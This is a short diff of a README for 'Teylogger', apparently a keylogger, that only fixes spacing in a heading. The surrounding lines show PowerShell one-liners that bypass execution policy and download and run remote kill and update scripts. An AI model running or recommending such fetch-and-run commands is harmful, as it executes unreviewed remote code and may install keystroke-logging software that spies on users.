@@ -26,7 +26,7 @@ Set-ExecutionPolicy Bypass -Scope Process -Force; Invoke-Expression ((New-Object
 Set-ExecutionPolicy Bypass -Scope Process -Force; Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/uynilo9/teylogger/main/installation/kill.ps1'))
 ```
 
-✨ Update```Teylogger```⌨ application:
+✨ Update ```Teylogger```⌨ application:
 
 ```powershell
 Set-ExecutionPolicy Bypass -Scope Process -Force; Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/uynilo9/teylogger/main/installation/update.ps1'))
